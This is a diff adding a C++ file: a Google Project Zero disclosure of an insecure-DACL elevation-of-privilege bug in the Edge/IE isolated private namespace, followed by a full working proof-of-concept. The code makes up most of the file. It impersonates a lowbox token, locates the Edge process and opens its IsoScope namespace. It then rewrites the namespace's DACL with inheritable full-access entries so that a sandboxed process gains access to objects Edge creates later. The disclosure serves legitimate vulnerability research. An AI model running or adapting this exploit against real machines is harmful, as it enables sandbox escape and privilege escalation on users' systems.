@@ -1,0 +1,378 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=879
+
+Windows: Edge/IE Isolated Private Namespace Insecure DACL EoP
+Platform: Windows 10 10586, Edge 25.10586.0.0 not tested 8.1 Update 2 or Windows 7
+Class: Elevation of Privilege
+
+Summary:
+The isolated private namespace created by ierutils has a insecure DACL which allows any appcontainer process to gain elevated permissions on the namespace directory which could lead to elevation of privilege. 
+
+Description:
+
+In iertutils library IsoOpenPrivateNamespace creates a new Window private namespace (which is an isolated object directory which can be referred to using a boundary descriptor). The function calls CreatePrivateNamespace, setting an explicit DACL which gives the current user, ALL APPLICATION PACKAGES and also owner rights of GENERIC_ALL. This is a problem because this is the only security barrier protecting access to the private namespace, when an application has already created it, this means that for example we can from any other App Container open IE’s or Edge’s with Full Access.
+
+Now how would you go about exploiting this? All the resources added to this isolated container use the default DACL of the calling process (which in IE’s case is usually the medium broker, and presumably in Edge is MicrosoftEdge.exe). The isolated container then adds explicit Low IL and Package SID ACEs to the created DACL of the object. So one way of exploiting this condition is to open the namespace for WRITE_DAC privilege and add inheritable ACEs to the DACL. When the kernel encounters inherited DACLs it ignores the token’s default DACL and applies the inherited permission. 
+
+Doing this would result in any new object in the isolated namespace being created by Edge or IE being accessible to the attacker, also giving write access to resources such as IsoSpaceV2_ScopedTrusted which are not supposed to be writable for example from a sandboxed IE tab. I’ve not spent much time actually working out what is or isn’t exploitable but at the least you’d get some level of information disclosure and no doubt EoP.
+
+Note that the boundary name isn’t an impediment to gaining access to the namespace as it’s something like IEUser_USERSID_MicrosoftEdge or IsoScope_PIDOFBROKER, both of which can be trivially determine or in worse case brute forced. You can’t create these namespaces from a lowbox token as the boundary descriptor doesn’t have the package SID, but in this case we don’t need to care. I’m submitted a bug for the other type of issue.
+
+Proof of Concept:
+
+I’ve provided a PoC as a C++ source code file. You need to compile it first targeted with Visual Studio 2015. It will look for a copy of MicrosoftEdge.exe and get its PID (this could be done as brute force), it will then impersonate a lowbox token which shouldn’t have access to any of Edge’s isolated namespace and tries to change the DACL of the root namespace object. 
+
+NOTE: For some reason this has a habit of causing MicrosoftEdge.exe to die with a security exception especially on x64. Perhaps it’s checking the DACL somewhere, but I very much doubt it. I’ve not worked out if this is some weird memory corruption occurring (although there’s a chance it wouldn’t be exploitable). 
+
+1) Compile the C++ source code file.
+2) Start a copy of Edge. You might want to navigate a tab somewhere. 
+3) Execute the PoC executable as a normal user
+4) It should successfully open the namespace and change the DACL.
+
+Expected Result:
+Access to the private namespace is not allowed.
+
+Observed Result:
+Access to the private namespace is granted and the DACL of the directory has been changed to a set of inherited permissions which will be used.
+*/
+
+#include <stdio.h>
+#include <tchar.h>
+#include <Windows.h>
+#include <winternl.h>
+#include <sddl.h>
+#include <memory>
+#include <string>
+#include <TlHelp32.h>
+#include <strstream>
+#include <sstream>
+
+typedef NTSTATUS(WINAPI* NtCreateLowBoxToken)(
+  OUT PHANDLE token,
+  IN HANDLE original_handle,
+  IN ACCESS_MASK access,
+  IN POBJECT_ATTRIBUTES object_attribute,
+  IN PSID appcontainer_sid,
+  IN DWORD capabilityCount,
+  IN PSID_AND_ATTRIBUTES capabilities,
+  IN DWORD handle_count,
+  IN PHANDLE handles);
+
+struct HandleDeleter
+{
+  typedef HANDLE pointer;
+  void operator()(HANDLE handle)
+  {
+    if (handle && handle != INVALID_HANDLE_VALUE)
+    {
+      DWORD last_error = ::GetLastError();
+      CloseHandle(handle);
+      ::SetLastError(last_error);
+    }
+  }
+};
+
+typedef std::unique_ptr<HANDLE, HandleDeleter> scoped_handle;
+
+struct LocalFreeDeleter
+{
+  typedef void* pointer;
+  void operator()(void* p)
+  {
+    if (p)
+      ::LocalFree(p);
+  }
+};
+
+typedef std::unique_ptr<void, LocalFreeDeleter> local_free_ptr;
+
+struct PrivateNamespaceDeleter
+{
+  typedef HANDLE pointer;
+  void operator()(HANDLE handle)
+  {
+    if (handle && handle != INVALID_HANDLE_VALUE)
+    {
+      ::ClosePrivateNamespace(handle, 0);
+    }
+  }
+};
+
+struct scoped_impersonation
+{
+  BOOL _impersonating;
+public:
+  scoped_impersonation(const scoped_handle& token) {
+    _impersonating = ImpersonateLoggedOnUser(token.get());
+  }
+
+  scoped_impersonation() {
+    if (_impersonating)
+      RevertToSelf();
+  }
+
+  BOOL impersonation() {
+    return _impersonating;
+  }
+};
+
+typedef std::unique_ptr<HANDLE, PrivateNamespaceDeleter> private_namespace;
+
+std::wstring GetCurrentUserSid()
+{
+  HANDLE token = nullptr;
+  if (!OpenProcessToken(::GetCurrentProcess(), TOKEN_QUERY, &token))
+    return false;
+  std::unique_ptr<HANDLE, HandleDeleter> token_scoped(token);
+
+  DWORD size = sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE;
+  std::unique_ptr<BYTE[]> user_bytes(new BYTE[size]);
+  TOKEN_USER* user = reinterpret_cast<TOKEN_USER*>(user_bytes.get());
+
+  if (!::GetTokenInformation(token, TokenUser, user, size, &size))
+    return false;
+
+  if (!user->User.Sid)
+    return false;
+
+  LPWSTR sid_name;
+  if (!ConvertSidToStringSid(user->User.Sid, &sid_name))
+    return false;
+
+  std::wstring ret = sid_name;
+  ::LocalFree(sid_name);
+  return ret;
+}
+
+std::wstring GetCurrentLogonSid()
+{
+  HANDLE token = NULL;
+  if (!::OpenProcessToken(::GetCurrentProcess(), TOKEN_QUERY, &token))
+    return false;
+  std::unique_ptr<HANDLE, HandleDeleter> token_scoped(token);
+
+  DWORD size = sizeof(TOKEN_GROUPS) + SECURITY_MAX_SID_SIZE;
+  std::unique_ptr<BYTE[]> user_bytes(new BYTE[size]);
+  TOKEN_GROUPS* groups = reinterpret_cast<TOKEN_GROUPS*>(user_bytes.get());
+
+  memset(user_bytes.get(), 0, size);
+
+  if (!::GetTokenInformation(token, TokenLogonSid, groups, size, &size))
+    return false;
+
+  if (groups->GroupCount != 1)
+    return false;
+
+  LPWSTR sid_name;
+  if (!ConvertSidToStringSid(groups->Groups[0].Sid, &sid_name))
+    return false;
+
+  std::wstring ret = sid_name;
+  ::LocalFree(sid_name);
+  return ret;
+}
+
+class BoundaryDescriptor
+{
+public:
+  BoundaryDescriptor()
+    : boundary_desc_(nullptr) {
+  }
+
+  ~BoundaryDescriptor() {
+    if (boundary_desc_) {
+      DeleteBoundaryDescriptor(boundary_desc_);
+    }
+  }
+
+  bool Initialize(const wchar_t* name) {
+    boundary_desc_ = ::CreateBoundaryDescriptorW(name, 0);
+    if (!boundary_desc_)
+      return false;
+
+    return true;
+  }
+
+  bool AddSid(LPCWSTR sid_str)
+  {
+    if (_wcsicmp(sid_str, L"CU") == 0)
+    {
+      return AddSid(GetCurrentUserSid().c_str());
+    }
+    else
+    {
+      PSID p = nullptr;
+
+      if (!::ConvertStringSidToSid(sid_str, &p))
+      {
+        return false;
+      }
+
+      std::unique_ptr<void, LocalFreeDeleter> buf(p);
+
+      SID_IDENTIFIER_AUTHORITY il_id_auth = { { 0,0,0,0,0,0x10 } };
+      PSID_IDENTIFIER_AUTHORITY sid_id_auth = GetSidIdentifierAuthority(p);
+
+      if (memcmp(il_id_auth.Value, sid_id_auth->Value, sizeof(il_id_auth.Value)) == 0)
+      {
+        return !!AddIntegrityLabelToBoundaryDescriptor(&boundary_desc_, p);
+      }
+      else
+      {
+        return !!AddSIDToBoundaryDescriptor(&boundary_desc_, p);
+      }
+    }
+  }
+
+  HANDLE boundry_desc() {
+    return boundary_desc_;
+  }
+
+private:
+  HANDLE boundary_desc_;
+};
+
+scoped_handle CreateLowboxToken()
+{
+  PSID package_sid_p;
+  if (!ConvertStringSidToSid(L"S-1-15-2-1-1-1-1-1-1-1-1-1-1-1", &package_sid_p))
+  {
+    printf("[ERROR] creating SID: %d\n", GetLastError());
+    return nullptr;
+  }
+  local_free_ptr package_sid(package_sid_p);
+
+  HANDLE process_token_h;
+  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &process_token_h))
+  {
+    printf("[ERROR] error opening process token SID: %d\n", GetLastError());
+    return nullptr;
+  }
+
+  scoped_handle process_token(process_token_h);  
+
+  NtCreateLowBoxToken fNtCreateLowBoxToken = (NtCreateLowBoxToken)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateLowBoxToken");
+  HANDLE lowbox_token_h;
+  OBJECT_ATTRIBUTES obja = {};
+  obja.Length = sizeof(obja);
+
+  NTSTATUS status = fNtCreateLowBoxToken(&lowbox_token_h, process_token_h, TOKEN_ALL_ACCESS, &obja, package_sid_p, 0, nullptr, 0, nullptr);
+  if (status != 0)
+  {
+    printf("[ERROR] creating lowbox token: %08X\n", status);
+    return nullptr;
+  }
+
+  scoped_handle lowbox_token(lowbox_token_h);
+  HANDLE imp_token;
+
+  if (!DuplicateTokenEx(lowbox_token_h, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenImpersonation, &imp_token))
+  {
+    printf("[ERROR] duplicating lowbox: %d\n", GetLastError());
+    return nullptr;
+  }
+
+  return scoped_handle(imp_token);
+}
+
+DWORD FindMicrosoftEdgeExe()
+{
+  scoped_handle th_snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
+  if (!th_snapshot)
+  {
+    printf("[ERROR] getting snapshot: %d\n", GetLastError());
+    return 0;
+  }
+  PROCESSENTRY32 proc_entry = {};
+  proc_entry.dwSize = sizeof(proc_entry);
+
+  if (!Process32First(th_snapshot.get(), &proc_entry))
+  {
+    printf("[ERROR] enumerating snapshot: %d\n", GetLastError());
+    return 0;
+  }
+
+  do
+  {
+    if (_wcsicmp(proc_entry.szExeFile, L"microsoftedge.exe") == 0)
+    {
+      return proc_entry.th32ProcessID;
+    }
+    proc_entry.dwSize = sizeof(proc_entry);
+  } while (Process32Next(th_snapshot.get(), &proc_entry));
+
+  return 0;
+}
+
+void ChangeDaclOnNamespace(LPCWSTR name, const scoped_handle& token)
+{
+  BoundaryDescriptor boundry;
+  if (!boundry.Initialize(name))
+  {
+    printf("[ERROR] initializing boundary descriptor: %d\n", GetLastError());
+    return;
+  }
+
+  PSECURITY_DESCRIPTOR psd;
+  ULONG sd_size = 0;
+  std::wstring sddl = L"D:(A;OICI;GA;;;WD)(A;OICI;GA;;;AC)(A;OICI;GA;;;WD)(A;OICI;GA;;;S-1-0-0)";
+  sddl += L"(A;OICI;GA;;;" + GetCurrentUserSid() + L")";
+  sddl += L"(A;OICI;GA;;;" + GetCurrentLogonSid() + L")";
+  sddl += L"S:(ML;OICI;NW;;;S-1-16-0)";
+
+  if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddl.c_str(), SDDL_REVISION_1, &psd, &sd_size))
+  {
+    printf("[ERROR] converting SDDL: %d\n", GetLastError());
+    return;
+  }
+  std::unique_ptr<void, LocalFreeDeleter> sd_buf(psd);
+
+  scoped_impersonation imp(token);
+  if (!imp.impersonation())
+  {
+    printf("[ERROR] impersonating lowbox: %d\n", GetLastError());
+    return;
+  }
+
+  private_namespace ns(OpenPrivateNamespace(boundry.boundry_desc(), name));
+  if (!ns)
+  {
+    printf("[ERROR] opening private namespace - %ls: %d\n", name, GetLastError());
+    return;
+  }
+
+  if (!SetKernelObjectSecurity(ns.get(), DACL_SECURITY_INFORMATION | LABEL_SECURITY_INFORMATION, psd))
+  {
+    printf("[ERROR] setting DACL on %ls: %d\n", name, GetLastError());
+    return;
+  }
+
+  printf("[SUCCESS] Opened Namespace and Reset DACL %ls\n", name);  
+}
+
+int main()
+{
+  scoped_handle lowbox_token = CreateLowboxToken();
+  if (!lowbox_token)
+  {
+    return 1;
+  }
+
+  std::wstring user_sid = GetCurrentUserSid();  
+  DWORD pid = FindMicrosoftEdgeExe();
+  if (pid == 0)
+  {
+    printf("[ERROR] Couldn't find MicrosoftEdge.exe running\n");
+    return 1;
+  }
+
+  printf("[SUCCESS] Found Edge Browser at PID: %X\n", pid);
+
+  std::wstringstream ss;
+
+  ss << L"IsoScope_" << std::hex << pid;
+
+  ChangeDaclOnNamespace(ss.str().c_str(), lowbox_token);
+
+  return 0;
+}
